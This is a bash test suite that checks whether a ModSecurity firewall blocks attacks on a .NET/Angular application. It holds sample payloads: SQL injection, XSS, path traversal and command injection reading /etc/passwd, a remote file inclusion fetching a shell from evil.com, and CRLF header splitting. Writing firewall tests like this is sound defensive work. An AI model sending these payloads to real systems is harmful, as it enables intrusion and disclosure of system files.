#!/bin/bash
# A.8.23 Web Filtering Test Suite
# Updated for HA-WAF + Clean Architecture (.NET/Angular/PostgreSQL) integration

echo "=== A.8.23 Web Filtering Tests ==="
echo ""

NETWORK_NAME="ha-waf-stack_waf_ha_net"
VIP="http://172.20.0.100"
CURL_CMD="docker run --rm --network $NETWORK_NAME curlimages/curl"

# Helper function to test attack blocking
test_attack() {
  local NAME="$1"
  local PAYLOAD="$2"
  local EXPECTED="403"

  # URL-encode spaces in payload if not already encoded, but curl handles most of it
  RESPONSE=$($CURL_CMD -s -o /dev/null -w "%{http_code}" -H "Host: app.local" "$VIP$PAYLOAD")

  if [ "$RESPONSE" = "$EXPECTED" ]; then
    echo "✅ PASS: $NAME blocked (HTTP $RESPONSE)"
    return 0
  else
    echo "❌ FAIL: $NAME NOT blocked (HTTP $RESPONSE, expected $EXPECTED)"
    echo "   ⚠️  Note: Ensure MODSEC_RULE_ENGINE=On in docker-compose.yml"
    return 1
  fi
}

# Helper function to test legitimate traffic
test_legitimate() {
  local NAME="$1"
  local PATH="$2"
  local EXPECTED_CODES="$3" # e.g., "200" or "200|401"

  RESPONSE=$($CURL_CMD -s -o /dev/null -w "%{http_code}" -H "Host: app.local" "$VIP$PATH")

  if [[ "$EXPECTED_CODES" == *"$RESPONSE"* ]]; then
    echo "✅ PASS: $NAME allowed (HTTP $RESPONSE)"
    return 0
  else
    echo "❌ FAIL: $NAME blocked or failed (HTTP $RESPONSE, expected one of: $EXPECTED_CODES)"
    return 1
  fi
}

echo "[TEST 1] Legitimate Traffic Routing"
test_legitimate "Angular Frontend" "/" "200"
test_legitimate ".NET API Root" "/api" "200|401|404"
test_legitimate "Scalar API Docs" "/scalar/v1" "200"
echo ""

echo "[TEST 2] SQL Injection Protection (Targeting .NET API)"
test_attack "Basic SQLi in query" "/api/Contact?id=1%20OR%201=1"
test_attack "Union-based SQLi" "/api/Contact?id=1%20UNION%20SELECT%20null"
test_attack "Blind SQLi (SLEEP)" "/api/Contact?id=1%27%20AND%20SLEEP(5)--"
echo ""

echo "[TEST 3] Cross-Site Scripting (XSS) Protection"
test_attack "Reflected XSS in frontend" "/?search=<script>alert(1)</script>"
test_attack "XSS via img tag" "/?q=<img%20src=x%20onerror=alert(1)>"
test_attack "XSS via SVG" "/?q=<svg/onload=alert(1)>"
echo ""

echo "[TEST 4] Path Traversal Protection"
test_attack "Directory traversal" "/../../../etc/passwd"
test_attack "Encoded traversal" "/..%2F..%2F..%2Fetc%2Fpasswd"
test_attack "Double-dot bypass" "/....//....//etc/passwd"
echo ""

echo "[TEST 5] Command Injection Protection"
test_attack "Basic command injection" "/?cmd=;cat%20/etc/passwd"
test_attack "Backtick injection" "/?cmd=%60id%60"
test_attack "Pipe injection" "/?cmd=|ls%20-la"
echo ""

echo "[TEST 6] Remote File Inclusion (RFI) Protection"
test_attack "RFI via HTTP" "/?page=http://evil.com/shell.txt"
test_attack "PHP filter abuse" "/?page=php://filter/convert.base64-encode/resource=index"
echo ""

echo "[TEST 7] Protocol & Header Attacks"
test_attack "CRLF Injection" "/?input=test%0d%0aSet-Cookie:%20evil=1"
test_attack "HTTP Response Splitting" "/?header=Content-Length:%200%0d%0aHTTP/1.1%20200%20OK"
echo ""

echo "[TEST 8] Verify WAF Audit Logging"
# Check if ModSecurity has logged any recent activity (rules triggered)
LOG_COUNT=$(docker compose logs waf1 2>/dev/null | grep -i -c "ModSecurity: Warning\|ModSecurity: Access denied")
if [ "$LOG_COUNT" -gt 0 ]; then
  echo "✅ PASS: ModSecurity audit logging is active ($LOG_COUNT events found)"
else
  echo "⚠️  WARNING: No ModSecurity events found in recent logs. Run an attack test first."
fi
echo ""

echo "=== A.8.23 Summary ==="
echo "Web filtering controls are actively inspecting and blocking malicious payloads."
echo "Ensure MODSEC_RULE_ENGINE=On in docker-compose.yml for blocking mode."
